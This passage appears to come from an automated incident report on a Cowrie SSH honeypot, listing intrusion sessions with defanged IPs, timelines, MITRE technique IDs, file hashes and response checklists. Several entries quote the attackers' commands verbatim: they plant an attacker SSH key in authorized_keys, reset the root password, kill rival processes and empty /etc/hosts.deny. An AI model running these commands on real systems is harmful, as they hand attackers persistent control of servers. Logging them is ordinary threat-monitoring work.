| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:52:30` | `cowrie.session.connect` |
| `2026-05-23 08:52:30` | `cowrie.client.version` |
| `2026-05-23 08:52:31` | `cowrie.client.kex` |
| `2026-05-23 08:52:31` | `cowrie.login.success` |
| `2026-05-23 08:52:31` | `cowrie.session.params` |
| `2026-05-23 08:52:31` | `cowrie.command.input` |
| `2026-05-23 08:52:31` | `cowrie.command.failed` |
| `2026-05-23 08:52:32` | `cowrie.log.closed` |
| `2026-05-23 08:52:32` | `cowrie.session.params` |
| `2026-05-23 08:52:32` | `cowrie.command.input` |
| `2026-05-23 08:52:32` | `cowrie.session.file_download` |
| `2026-05-23 08:52:32` | `cowrie.log.closed` |
| `2026-05-23 08:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec64208ef58

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-23 08:52 |
| **Last Seen** | 2026-05-23 08:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:52:34` | `cowrie.session.connect` |
| `2026-05-23 08:52:34` | `cowrie.client.version` |
| `2026-05-23 08:52:34` | `cowrie.client.kex` |
| `2026-05-23 08:52:35` | `cowrie.login.success` |
| `2026-05-23 08:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccee6f0ff58

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-23 08:56 |
| **Last Seen** | 2026-05-23 08:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:56:13` | `cowrie.session.connect` |
| `2026-05-23 08:56:13` | `cowrie.client.version` |
| `2026-05-23 08:56:13` | `cowrie.client.kex` |
| `2026-05-23 08:56:14` | `cowrie.login.success` |
| `2026-05-23 08:56:14` | `cowrie.session.params` |
| `2026-05-23 08:56:14` | `cowrie.command.input` |
| `2026-05-23 08:56:14` | `cowrie.command.failed` |
| `2026-05-23 08:56:14` | `cowrie.log.closed` |
| `2026-05-23 08:56:15` | `cowrie.session.params` |
| `2026-05-23 08:56:15` | `cowrie.command.input` |
| `2026-05-23 08:56:15` | `cowrie.session.file_download` |
| `2026-05-23 08:56:15` | `cowrie.log.closed` |
| `2026-05-23 08:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c33041dfc5

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-23 08:56 |
| **Last Seen** | 2026-05-23 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:56:17` | `cowrie.session.connect` |
| `2026-05-23 08:56:17` | `cowrie.client.version` |
| `2026-05-23 08:56:17` | `cowrie.client.kex` |
| `2026-05-23 08:56:18` | `cowrie.login.success` |
| `2026-05-23 08:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9cf57c59f3

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-23 09:03 |
| **Last Seen** | 2026-05-23 09:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:03:50` | `cowrie.session.connect` |
| `2026-05-23 09:03:50` | `cowrie.client.version` |
| `2026-05-23 09:03:50` | `cowrie.client.kex` |
| `2026-05-23 09:03:50` | `cowrie.login.success` |
| `2026-05-23 09:03:51` | `cowrie.session.params` |
| `2026-05-23 09:03:51` | `cowrie.command.input` |
| `2026-05-23 09:03:51` | `cowrie.command.failed` |
| `2026-05-23 09:03:51` | `cowrie.log.closed` |
| `2026-05-23 09:03:51` | `cowrie.session.params` |
| `2026-05-23 09:03:51` | `cowrie.command.input` |
| `2026-05-23 09:03:51` | `cowrie.session.file_download` |
| `2026-05-23 09:03:51` | `cowrie.log.closed` |
| `2026-05-23 09:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-682b173d195f

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-23 09:03 |
| **Last Seen** | 2026-05-23 09:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:03:53` | `cowrie.session.connect` |
| `2026-05-23 09:03:53` | `cowrie.client.version` |
| `2026-05-23 09:03:53` | `cowrie.client.kex` |
| `2026-05-23 09:03:54` | `cowrie.login.success` |
| `2026-05-23 09:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56ef55c4104

| Field | Detail |
|---|---|
| **Source IP** | `117.72.114[.]183` |
| **First Seen** | 2026-05-23 09:04 |
| **Last Seen** | 2026-05-23 09:05 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tRfFtvOHKGas"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:04:10` | `cowrie.session.connect` |
| `2026-05-23 09:04:11` | `cowrie.client.version` |
| `2026-05-23 09:04:11` | `cowrie.client.kex` |
| `2026-05-23 09:04:19` | `cowrie.login.success` |
| `2026-05-23 09:04:21` | `cowrie.session.params` |
| `2026-05-23 09:04:21` | `cowrie.command.input` |
| `2026-05-23 09:04:21` | `cowrie.command.failed` |
| `2026-05-23 09:04:21` | `cowrie.log.closed` |
| `2026-05-23 09:04:22` | `cowrie.session.params` |
| `2026-05-23 09:04:22` | `cowrie.command.input` |
| `2026-05-23 09:04:22` | `cowrie.session.file_download` |
| `2026-05-23 09:04:22` | `cowrie.log.closed` |
| `2026-05-23 09:04:51` | `cowrie.session.params` |
| `2026-05-23 09:04:51` | `cowrie.command.input` |
| `2026-05-23 09:04:51` | `cowrie.log.closed` |
| `2026-05-23 09:04:53` | `cowrie.session.params` |
| `2026-05-23 09:04:53` | `cowrie.command.input` |
| `2026-05-23 09:04:54` | `cowrie.log.closed` |
| `2026-05-23 09:04:55` | `cowrie.session.params` |
| `2026-05-23 09:04:55` | `cowrie.command.input` |
| `2026-05-23 09:04:56` | `cowrie.session.file_download` |
| `2026-05-23 09:04:56` | `cowrie.log.closed` |
| `2026-05-23 09:04:57` | `cowrie.session.params` |
| `2026-05-23 09:04:57` | `cowrie.command.input` |
| `2026-05-23 09:04:58` | `cowrie.log.closed` |
| `2026-05-23 09:04:58` | `cowrie.session.params` |
| `2026-05-23 09:04:58` | `cowrie.command.input` |
| `2026-05-23 09:05:00` | `cowrie.log.closed` |
| `2026-05-23 09:05:01` | `cowrie.session.params` |
| `2026-05-23 09:05:01` | `cowrie.command.input` |
| `2026-05-23 09:05:01` | `cowrie.command.input` |
| `2026-05-23 09:05:02` | `cowrie.log.closed` |
| `2026-05-23 09:05:03` | `cowrie.session.params` |
| `2026-05-23 09:05:03` | `cowrie.command.input` |
| `2026-05-23 09:05:05` | `cowrie.log.closed` |
| `2026-05-23 09:05:05` | `cowrie.session.params` |
| `2026-05-23 09:05:05` | `cowrie.command.input` |
| `2026-05-23 09:05:06` | `cowrie.log.closed` |
| `2026-05-23 09:05:07` | `cowrie.session.params` |
| `2026-05-23 09:05:07` | `cowrie.command.input` |
| `2026-05-23 09:05:08` | `cowrie.log.closed` |
| `2026-05-23 09:05:09` | `cowrie.session.params` |
| `2026-05-23 09:05:09` | `cowrie.command.input` |
| `2026-05-23 09:05:10` | `cowrie.log.closed` |
| `2026-05-23 09:05:10` | `cowrie.session.params` |
| `2026-05-23 09:05:10` | `cowrie.command.input` |
| `2026-05-23 09:05:11` | `cowrie.log.closed` |
| `2026-05-23 09:05:11` | `cowrie.session.params` |
| `2026-05-23 09:05:11` | `cowrie.command.input` |
| `2026-05-23 09:05:12` | `cowrie.log.closed` |
| `2026-05-23 09:05:13` | `cowrie.session.params` |
| `2026-05-23 09:05:13` | `cowrie.command.input` |
| `2026-05-23 09:05:13` | `cowrie.log.closed` |
| `2026-05-23 09:05:14` | `cowrie.session.params` |
| `2026-05-23 09:05:14` | `cowrie.command.input` |
| `2026-05-23 09:05:16` | `cowrie.log.closed` |
| `2026-05-23 09:05:16` | `cowrie.session.params` |
| `2026-05-23 09:05:16` | `cowrie.command.input` |
| `2026-05-23 09:05:18` | `cowrie.log.closed` |
| `2026-05-23 09:05:18` | `cowrie.session.params` |
| `2026-05-23 09:05:18` | `cowrie.command.input` |
| `2026-05-23 09:05:18` | `cowrie.log.closed` |
| `2026-05-23 09:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.72.114[.]183` to AbuseIPDB if not already reported
- [ ] Block `117.72.114[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23dc84ea0a91

| Field | Detail |
|---|---|
| **Source IP** | `180.76.170[.]111` |
| **First Seen** | 2026-05-23 09:10 |
| **Last Seen** | 2026-05-23 09:11 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FGgzlRmGFB0k"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:10:39` | `cowrie.session.connect` |
| `2026-05-23 09:10:40` | `cowrie.client.version` |
| `2026-05-23 09:10:40` | `cowrie.client.kex` |
| `2026-05-23 09:10:42` | `cowrie.login.success` |
| `2026-05-23 09:10:43` | `cowrie.session.params` |
| `2026-05-23 09:10:43` | `cowrie.command.input` |
| `2026-05-23 09:10:43` | `cowrie.command.failed` |
| `2026-05-23 09:10:43` | `cowrie.log.closed` |
| `2026-05-23 09:10:44` | `cowrie.session.params` |
| `2026-05-23 09:10:44` | `cowrie.command.input` |
| `2026-05-23 09:10:44` | `cowrie.session.file_download` |
| `2026-05-23 09:10:44` | `cowrie.log.closed` |
| `2026-05-23 09:10:57` | `cowrie.session.params` |
| `2026-05-23 09:10:57` | `cowrie.command.input` |
| `2026-05-23 09:10:57` | `cowrie.log.closed` |
| `2026-05-23 09:10:58` | `cowrie.session.params` |
| `2026-05-23 09:10:58` | `cowrie.command.input` |
| `2026-05-23 09:10:58` | `cowrie.log.closed` |
| `2026-05-23 09:10:59` | `cowrie.session.params` |
| `2026-05-23 09:10:59` | `cowrie.command.input` |
| `2026-05-23 09:10:59` | `cowrie.session.file_download` |
| `2026-05-23 09:10:59` | `cowrie.log.closed` |
| `2026-05-23 09:11:00` | `cowrie.session.params` |
| `2026-05-23 09:11:00` | `cowrie.command.input` |
| `2026-05-23 09:11:00` | `cowrie.log.closed` |
| `2026-05-23 09:11:00` | `cowrie.session.params` |
| `2026-05-23 09:11:00` | `cowrie.command.input` |
| `2026-05-23 09:11:01` | `cowrie.log.closed` |
| `2026-05-23 09:11:02` | `cowrie.session.params` |
| `2026-05-23 09:11:02` | `cowrie.command.input` |
| `2026-05-23 09:11:02` | `cowrie.command.input` |
| `2026-05-23 09:11:02` | `cowrie.log.closed` |
| `2026-05-23 09:11:03` | `cowrie.session.params` |
| `2026-05-23 09:11:03` | `cowrie.command.input` |
| `2026-05-23 09:11:03` | `cowrie.log.closed` |
| `2026-05-23 09:11:04` | `cowrie.session.params` |
| `2026-05-23 09:11:04` | `cowrie.command.input` |
| `2026-05-23 09:11:04` | `cowrie.log.closed` |
| `2026-05-23 09:11:05` | `cowrie.session.params` |
| `2026-05-23 09:11:05` | `cowrie.command.input` |
| `2026-05-23 09:11:05` | `cowrie.log.closed` |
| `2026-05-23 09:11:06` | `cowrie.session.params` |
| `2026-05-23 09:11:06` | `cowrie.command.input` |
| `2026-05-23 09:11:06` | `cowrie.log.closed` |
| `2026-05-23 09:11:07` | `cowrie.session.params` |
| `2026-05-23 09:11:07` | `cowrie.command.input` |
| `2026-05-23 09:11:07` | `cowrie.log.closed` |
| `2026-05-23 09:11:08` | `cowrie.session.params` |
| `2026-05-23 09:11:08` | `cowrie.command.input` |
| `2026-05-23 09:11:09` | `cowrie.log.closed` |
| `2026-05-23 09:11:09` | `cowrie.session.params` |
| `2026-05-23 09:11:09` | `cowrie.command.input` |
| `2026-05-23 09:11:10` | `cowrie.log.closed` |
| `2026-05-23 09:11:10` | `cowrie.session.params` |
| `2026-05-23 09:11:10` | `cowrie.command.input` |
| `2026-05-23 09:11:11` | `cowrie.log.closed` |
| `2026-05-23 09:11:11` | `cowrie.session.params` |
| `2026-05-23 09:11:11` | `cowrie.command.input` |
| `2026-05-23 09:11:11` | `cowrie.log.closed` |
| `2026-05-23 09:11:12` | `cowrie.session.params` |
| `2026-05-23 09:11:12` | `cowrie.command.input` |
| `2026-05-23 09:11:12` | `cowrie.log.closed` |
| `2026-05-23 09:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.170[.]111` to AbuseIPDB if not already reported
- [ ] Block `180.76.170[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5400c9648f

| Field | Detail |
|---|---|
| **Source IP** | `180.76.170[.]111` |
| **First Seen** | 2026-05-23 09:11 |
| **Last Seen** | 2026-05-23 09:12 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Jvft58XdFSQp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:11:54` | `cowrie.session.connect` |
| `2026-05-23 09:11:56` | `cowrie.client.version` |
| `2026-05-23 09:11:56` | `cowrie.client.kex` |
| `2026-05-23 09:11:58` | `cowrie.login.success` |
| `2026-05-23 09:11:58` | `cowrie.session.params` |
| `2026-05-23 09:11:58` | `cowrie.command.input` |
| `2026-05-23 09:11:58` | `cowrie.command.failed` |
| `2026-05-23 09:11:59` | `cowrie.log.closed` |
| `2026-05-23 09:11:59` | `cowrie.session.params` |
| `2026-05-23 09:11:59` | `cowrie.command.input` |
| `2026-05-23 09:11:59` | `cowrie.session.file_download` |
| `2026-05-23 09:11:59` | `cowrie.log.closed` |
| `2026-05-23 09:12:10` | `cowrie.session.params` |
| `2026-05-23 09:12:10` | `cowrie.command.input` |
| `2026-05-23 09:12:10` | `cowrie.log.closed` |
| `2026-05-23 09:12:11` | `cowrie.session.params` |
| `2026-05-23 09:12:11` | `cowrie.command.input` |
| `2026-05-23 09:12:11` | `cowrie.log.closed` |
| `2026-05-23 09:12:12` | `cowrie.session.params` |
| `2026-05-23 09:12:12` | `cowrie.command.input` |
| `2026-05-23 09:12:12` | `cowrie.session.file_download` |
| `2026-05-23 09:12:12` | `cowrie.log.closed` |
| `2026-05-23 09:12:13` | `cowrie.session.params` |
| `2026-05-23 09:12:13` | `cowrie.command.input` |
| `2026-05-23 09:12:13` | `cowrie.log.closed` |
| `2026-05-23 09:12:14` | `cowrie.session.params` |
| `2026-05-23 09:12:14` | `cowrie.command.input` |
| `2026-05-23 09:12:14` | `cowrie.log.closed` |
| `2026-05-23 09:12:15` | `cowrie.session.params` |
| `2026-05-23 09:12:15` | `cowrie.command.input` |
| `2026-05-23 09:12:15` | `cowrie.command.input` |
| `2026-05-23 09:12:15` | `cowrie.log.closed` |
| `2026-05-23 09:12:16` | `cowrie.session.params` |
| `2026-05-23 09:12:16` | `cowrie.command.input` |
| `2026-05-23 09:12:16` | `cowrie.log.closed` |
| `2026-05-23 09:12:17` | `cowrie.session.params` |
| `2026-05-23 09:12:17` | `cowrie.command.input` |
| `2026-05-23 09:12:17` | `cowrie.log.closed` |
| `2026-05-23 09:12:18` | `cowrie.session.params` |
| `2026-05-23 09:12:18` | `cowrie.command.input` |
| `2026-05-23 09:12:18` | `cowrie.log.closed` |
| `2026-05-23 09:12:19` | `cowrie.session.params` |
| `2026-05-23 09:12:19` | `cowrie.command.input` |
| `2026-05-23 09:12:19` | `cowrie.log.closed` |
| `2026-05-23 09:12:20` | `cowrie.session.params` |
| `2026-05-23 09:12:20` | `cowrie.command.input` |
| `2026-05-23 09:12:20` | `cowrie.log.closed` |
| `2026-05-23 09:12:20` | `cowrie.session.params` |
| `2026-05-23 09:12:20` | `cowrie.command.input` |
| `2026-05-23 09:12:21` | `cowrie.log.closed` |
| `2026-05-23 09:12:21` | `cowrie.session.params` |
| `2026-05-23 09:12:21` | `cowrie.command.input` |
| `2026-05-23 09:12:22` | `cowrie.log.closed` |
| `2026-05-23 09:12:22` | `cowrie.session.params` |
| `2026-05-23 09:12:22` | `cowrie.command.input` |
| `2026-05-23 09:12:22` | `cowrie.log.closed` |
| `2026-05-23 09:12:23` | `cowrie.session.params` |
| `2026-05-23 09:12:23` | `cowrie.command.input` |
| `2026-05-23 09:12:23` | `cowrie.log.closed` |
| `2026-05-23 09:12:24` | `cowrie.session.params` |
| `2026-05-23 09:12:24` | `cowrie.command.input` |
| `2026-05-23 09:12:24` | `cowrie.log.closed` |
| `2026-05-23 09:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.170[.]111` to AbuseIPDB if not already reported
- [ ] Block `180.76.170[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f80c9aef2c

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:18 |
| **Last Seen** | 2026-05-23 09:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:18:38` | `cowrie.session.connect` |
| `2026-05-23 09:18:38` | `cowrie.client.version` |
| `2026-05-23 09:18:38` | `cowrie.client.kex` |
| `2026-05-23 09:18:39` | `cowrie.login.success` |
| `2026-05-23 09:18:40` | `cowrie.session.params` |
| `2026-05-23 09:18:40` | `cowrie.command.input` |
| `2026-05-23 09:18:40` | `cowrie.command.failed` |
| `2026-05-23 09:18:41` | `cowrie.log.closed` |
| `2026-05-23 09:18:41` | `cowrie.session.params` |
| `2026-05-23 09:18:41` | `cowrie.command.input` |
| `2026-05-23 09:18:41` | `cowrie.session.file_download` |
| `2026-05-23 09:18:41` | `cowrie.log.closed` |
| `2026-05-23 09:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8cf8cbb360e

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:18 |
